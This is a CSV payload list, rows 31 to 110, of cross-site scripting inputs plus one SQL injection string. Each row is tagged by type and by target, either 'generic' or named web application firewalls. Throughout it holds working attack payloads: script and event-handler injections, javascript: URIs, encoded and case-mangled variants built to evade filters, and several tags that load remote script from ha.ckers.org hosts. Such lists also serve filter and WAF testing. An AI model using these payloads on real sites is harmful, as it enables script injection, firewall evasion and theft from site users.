31,<script>alert(1)</script>,xss,generic
32,<scRipt>alErt(1)</scrIpt>,xss,generic
33,<img src=x onerror=alert(1)>,xss,generic
34,<script type=vbscript>MsgBox(0)</script>,xss,generic
35,a'or 2=2--,sql,generic
36,"<IMG SRC=javascript:alert(""XSS"")>",xss,generic
37,"<IMG SRC=JaVaScRiPt:alert(""XSS"")>",xss,generic
38,"<BODY ONLOAD=alert(""XSS"")>",xss,generic
39,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>,xss,generic
40,"<IMG SRC=""   javascript:alert(""XSS"");"">",xss,generic
41,<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,xss,generic
42,"<BODY BACKGROUND=""javascript:alert(""XSS"")"">",xss,generic
43,"<IMG DYNSRC=""javascript:alert(""XSS"")"">",xss,generic
44,"<INPUT TYPE=""image"" DYNSRC=""javascript:alert(""XSS"");"">",xss,generic
45,"<BGSOUND SRC=""javascript:alert(""XSS"");"">",xss,generic
46,"<br size=""&{alert(""XSS"")}"">",xss,generic
47,"<LAYER SRC=""http://xss.ha.ckers.org/a.js""></layer>",xss,generic
48,"<LINK REL=""stylesheet"" HREF=""javascript:alert(""XSS"");"">",xss,generic
49,"<IMG SRC=""vbscript:msgbox(""XSS"")"">",xss,generic
50,"<IMG SRC=""mocha:[code]"">",xss,generic
51,"<IMG SRC=""livescript:[code]"">",xss,generic
52,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert(""XSS"");"">",xss,generic
53,"<IFRAME SRC=javascript:alert(""XSS"")></IFRAME>",xss,generic
54,"<FRAMESET><FRAME SRC=javascript:alert(""XSS"")></FRAME></FRAMESET>",xss,generic
55,"<TABLE BACKGROUND=""javascript:alert(""XSS"")"">",xss,generic
56,"<DIV STYLE=""background-image: url(javascript:alert(""XSS""))"">",xss,generic
57,"<DIV STYLE=""behaviour: url(""http://xss.ha.ckers.org/exploit.htc"");"">",xss,generic
58,"<DIV STYLE=""width: expression(alert(""XSS""));"">",xss,generic
59,"<STYLE>@im\port""\ja\vasc\ript:alert(""XSS"")"";</STYLE>",xss,generic
60,"<IMG STYLE=""xss: expre\ssion(alert(""XSS""))"">",xss,generic
61,"<STYLE TYPE=""text/javascript"">alert(""XSS"");</STYLE>",xss,generic
62,"<XML SRC=""javascript:alert(""XSS"");"">",xss,generic
63,"""> <BODY ONLOAD=""a();""><SCRIPT>function a(){alert(""XSS"");}</SCRIPT><""",xss,generic
64,"<SCRIPT SRC=""http://xss.ha.ckers.org/xss.jpg""></SCRIPT>",xss,generic
65,"<IMG SRC=""javascript:alert(""XSS"")""",xss,generic
66,"<SCRIPT a="">"" SRC=""http://xss.ha.ckers.org/a.js""></SCRIPT>",xss,generic
67,"<SCRIPT ="">"" SRC=""http://xss.ha.ckers.org/a.js""></SCRIPT>",xss,generic
68,"<SCRIPT a="">"" """" SRC=""http://xss.ha.ckers.org/a.js""></SCRIPT><SCRIPT ""a="">"""" SRC=""http://xss.ha.ckers.org/a.js""></SCRIPT>",xss,generic
69,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://xss.ha.ckers.org/a.js""></SCRIPT>",xss,generic
70,<A HREF=http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D>link</A>,xss,generic
71,<A HREF=ht://www.google.com/>link</A>,xss,generic
72,<A HREF=http://google.com/>link</A>,xss,generic
73,<A HREF=http://www.google.com./>link</A>,xss,generic
74,"<A HREF=""javascript:document.location=""http://www.google.com/"""">link</A>",xss,generic
75,<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>,xss,generic
76,"<BASE HREF=""javascript:alert(""XSS"");//"">",xss,generic
77,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss,generic
78,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss,generic
79,"<IMG SRC=# onmouseover=""alert(""xxs"")"">",xss,generic
80,"<IMG SRC= onmouseover=""alert(""xxs"")"">",xss,generic
81,"<IMG onmouseover=""alert(""xxs"")"">",xss,generic
82,"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",xss,generic
83,"<img src=x onerror=""&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"">",xss,generic
84,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss,generic
85,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss,generic
86,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss,generic
87,"<IMG SRC=""javascript:alert(""XSS"");"">",xss,generic
88,"<IMG SRC=""jav&#x09;ascript:alert(""XSS"");"">",xss,generic
89,"<IMG SRC=""jav&#x0A;ascript:alert(""XSS"");"">",xss,generic
90,"<IMG SRC=""jav&#x0D;ascript:alert(""XSS"");"">",xss,generic
91,"<IMG SRC="" &#14;  javascript:alert(""XSS"");"">",xss,generic
92,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,generic
93,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss,generic
94,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,generic
95,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss,generic
96,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss,generic
97,<SCRIPT SRC=//ha.ckers.org/.j>,xss,generic
98,"<IMG SRC=""javascript:alert(""XSS"")""",xss,generic
99,<iframe src=http://ha.ckers.org/scriptlet.html <,xss,generic
100,"\"";alert(""XSS"");//",xss,generic
101,"</script><script>alert(""XSS"");</script>",xss,generic
102,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss,generic
103,<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>,xss,modsecurity
104,<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>,xss,webknight
105,<marquee/onstart=confirm(2)>,xss,webknight
106,"<table background=""javascript:alert(1)""></table>",xss,f5asm
107,"""/><marquee onfinish=confirm(123)>a</marquee>",xss,f5asm
108,<svg/onload=prompt(1);>,xss,dotdefender
109,"<isindex action=""javas&tab;cript:alert(1)"" type=image>",xss,dotdefender
110,<marquee/onstart=confirm(2)>,xss,dotdefender
